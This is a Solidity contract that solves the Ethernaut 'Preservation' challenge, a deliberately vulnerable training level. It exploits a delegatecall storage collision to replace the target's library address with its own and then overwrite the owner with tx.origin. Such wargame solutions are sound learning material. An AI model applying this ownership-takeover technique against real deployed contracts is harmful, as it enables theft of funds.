// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../ethernaut/levels/Preservation.sol';

contract PreservationSolution {
  Preservation target;
  address placeholder;
  address targetSlot;
  
  constructor(address targetAddress) {
    target = Preservation(targetAddress);
  }

  function exploit() public {
    target.setFirstTime(uint256(uint160(bytes20(address(this)))));
    target.setFirstTime(0);
  }

  function setTime(uint) public {
    targetSlot = tx.origin;
  } 
}